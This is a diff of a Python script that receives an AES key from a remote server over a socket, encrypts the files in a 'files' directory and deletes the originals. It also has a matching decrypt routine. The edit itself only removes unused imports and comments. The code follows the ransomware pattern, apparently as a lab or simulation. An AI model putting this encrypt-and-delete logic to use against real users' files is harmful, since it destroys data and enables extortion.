@@ -1,11 +1,6 @@
 import os
 import base64
-from pathlib import Path
-from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-import getpass
 import socket
 import threading
 import enum
@@ -43,13 +38,13 @@ def encrypt_folder(folder_path: str, key: bytes):
 
             encrypted_data = aesgcm.encrypt(nonce, data, None)
 
-            # Save encrypted file
+            # save encrypted file
             enc_file_path = file_path + ".enc"
 
             with open(enc_file_path, "wb") as f:
                 f.write(nonce + encrypted_data)
 
-            # Remove original file
+            # remove original file
             os.remove(file_path)
 
             print(f"Encrypted: {file_path} -> {enc_file_path}")
@@ -85,13 +80,13 @@ def decrypt_folder(folder_path: str, key: bytes):
                 print(f"Failed to decrypt: {file_path}")
                 continue
 
-            # Restore original filename (remove .enc)
+            # restore original filename (remove .enc)
             original_file_path = file_path[:-4]
 
             with open(original_file_path, "wb") as f:
                 f.write(decrypted_data)
 
-            # Remove encrypted file
+            # remove encrypted file
             os.remove(file_path)
 
             print(f"Decrypted: {file_path} -> {original_file_path}")
@@ -136,13 +131,9 @@ def handle_server_communication(server_socket: socket):
             
             k, s = response.split("::")
 
-            # First decode the base64 pieces from the server
             decoded_key = base64.b64decode(k)
             salt = base64.b64decode(s)
 
-            # Some server variants may double-base64 the key (so the decoded
-            # value is an ASCII base64 string). Normalize to the raw 32-byte key
-            # required by AES-256-GCM.
             key = decoded_key
             if len(key) != 32:
                 try:
@@ -155,7 +146,6 @@ def handle_server_communication(server_socket: socket):
             print("Key:", key)
             print("Salt:", salt)
 
-            # encrypt using the repository's files directory
             base_files_dir = "files"
             encrypt_folder(str(base_files_dir), key)
 
